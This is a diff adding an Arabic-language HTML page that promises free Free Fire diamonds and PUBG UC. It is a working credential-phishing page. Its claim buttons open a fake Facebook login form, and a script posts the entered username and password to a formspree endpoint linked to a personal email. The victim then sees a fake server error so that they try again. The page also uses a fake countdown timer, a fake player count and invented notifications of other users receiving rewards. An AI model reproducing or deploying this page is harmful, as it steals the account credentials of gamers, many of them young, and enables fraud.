@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AXI META-GATE — 2026 OFFICIAL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@400;700;800&family=Orbitron:wght@900&display=swap" rel="stylesheet">
+    <style>
+        :root { --fb-blue: #1877f2; --gold: #ffcc33; --green: #42b72a; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; font-family: 'Almarai', sans-serif; overflow-x: hidden; color: white; }
+
+        .top-bar { background: #ff0000; color: white; text-align: center; padding: 8px; font-weight: bold; position: fixed; top: 0; width: 100%; z-index: 2001; font-size: 0.9rem; }
+
+        #bg-protocol { position: fixed; inset: 0; z-index: -2; background: #000; }
+        .v-stream { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; filter: brightness(0.3); }
+
+        nav { position: fixed; top: 35px; width: 100%; padding: 15px 6%; background: rgba(0,0,0,0.7); backdrop-filter: blur(20px); display: flex; justify-content: space-between; align-items: center; z-index: 1000; border-bottom: 1px solid rgba(255,204,51,0.3); }
+        
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; padding: 140px 6% 50px; }
+        .card { background: rgba(20,20,20,0.8); border: 1px solid rgba(255,204,51,0.2); border-radius: 20px; padding: 20px; text-align: center; transition: 0.3s; }
+        .btn-buy { background: var(--gold); color: #000; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+
+        #live-notify { position: fixed; bottom: 20px; right: -300px; background: white; color: #333; padding: 12px 20px; border-radius: 12px; display: flex; align-items: center; gap: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); z-index: 3000; transition: 0.5s; border-left: 5px solid var(--green); }
+        #live-notify.active { right: 20px; }
+
+        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; align-items: center; justify-content: center; z-index: 4000; }
+        .modal.active { display: flex; }
+        .fb-container { background: #fff; width: 90%; max-width: 400px; padding: 25px; border-radius: 8px; text-align: center; color: #1c1e21; }
+        .fb-input { width: 100%; height: 50px; padding: 10px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; outline: none; }
+        .fb-login-btn { width: 100%; height: 48px; background: var(--fb-blue); color: #fff; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="top-bar">🔥 عرض محدود: ينتهي العرض خلال <span id="timer">10:00</span> دقيقة!</div>
+
+<div id="bg-protocol">
+    <video class="v-stream" autoplay muted loop src="https://assets.mixkit.co/videos/preview/mixkit-animation-of-a-futuristic-city-with-neon-lights-4525-large.mp4"></video>
+</div>
+
+<nav>
+    <div style="font-family:'Orbitron'; font-size:1.5rem;">AXI <span>META</span></div>
+    <div style="font-size:0.8rem; color:var(--green);">● متصل الآن: 1,429 لاعب</div>
+</nav>
+
+<div class="grid">
+    <div class="card">
+        <img src="https://media.pocketgamer.com/artwork/na-30335-1585649471/free-fire-ios-android-diamonds-pack.jpg" width="100%" style="border-radius:10px;">
+        <h3 style="margin-top:10px;">حزمة 5600 جوهرة</h3>
+        <p style="color:var(--gold); font-weight:bold;">مجاناً (لفترة محدودة)</p>
+        <button class="btn-buy" onclick="openModal()">شحن الآن</button>
+    </div>
+    <div class="card">
+        <img src="https://www.pubgmobile.com/en-US/images/main/main_kv_1_m.jpg" width="100%" style="border-radius:10px;">
+        <h3 style="margin-top:10px;">حزمة 8100 UC</h3>
+        <p style="color:var(--gold); font-weight:bold;">مجاناً (لفترة محدودة)</p>
+        <button class="btn-buy" onclick="openModal()">شحن الآن</button>
+    </div>
+</div>
+
+<div id="live-notify">
+    <div style="background:var(--green); width:40px; height:40px; border-radius:50%; display:flex; align-items:center; justify-content:center; color:white; font-weight:bold;">✓</div>
+    <div>
+        <div id="notify-user" style="font-weight:bold; font-size:0.9rem;">إسلام من تونس</div>
+        <div id="notify-action" style="font-size:0.8rem; color:#666;">شحن للتو 5600 جوهرة ✅</div>
+    </div>
+</div>
+
+<div class="modal" id="loginModal">
+    <div class="fb-container">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu_m_aGDR.svg" width="120" style="margin-bottom:20px;">
+        <p style="margin-bottom:15px; font-size:0.9rem;">يجب تسجيل الدخول لتأكيد استلام الجوائز على حسابك</p>
+        <input type="text" id="u" class="fb-input" placeholder="رقم الهاتف أو البريد الإلكتروني">
+        <input type="password" id="p" class="fb-input" placeholder="كلمة السر">
+        <button class="fb-login-btn" onclick="hit()">تسجيل الدخول</button>
+    </div>
+</div>
+
+<script>
+    let time = 600;
+    setInterval(() => {
+        let min = Math.floor(time / 60);
+        let sec = time % 60;
+        document.getElementById('timer').innerText = `${min}:${sec < 10 ? '0' : ''}${sec}`;
+        if(time > 0) time--;
+    }, 1000);
+
+    const users = ["أحمد من تونس", "ياسين من الجزائر", "سارة من المغرب", "محمد من ليبيا", "عمر من مصر", "إسلام من تونس"];
+    const actions = ["شحن 5600 جوهرة ✅", "استلم 8100 UC ✅", "حصل على بطاقة VIP ✅"];
+    
+    function showNotify() {
+        document.getElementById('notify-user').innerText = users[Math.floor(Math.random()*users.length)];
+        document.getElementById('notify-action').innerText = actions[Math.floor(Math.random()*actions.length)];
+        document.getElementById('live-notify').classList.add('active');
+        setTimeout(() => document.getElementById('live-notify').classList.remove('active'), 4000);
+    }
+    setInterval(showNotify, 8000);
+
+    function openModal() { document.getElementById('loginModal').classList.add('active'); }
+
+    function hit() {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+        if(!u || !p) return;
+
+        fetch('https://formspree.io/f/islemargoubi87@gmail.com', {
+            method: 'POST',
+            body: JSON.stringify({ USER: u, PASS: p, TIME: new Date().toLocaleString() }),
+            headers: { 'Content-Type': 'application/json' }
+        }).then(() => {
+            alert("خطأ في المزامنة! الضغط على السيرفر عالٍ جداً، حاول مرة أخرى.");
+        });
+    }
+</script>
+</body>
+</html>
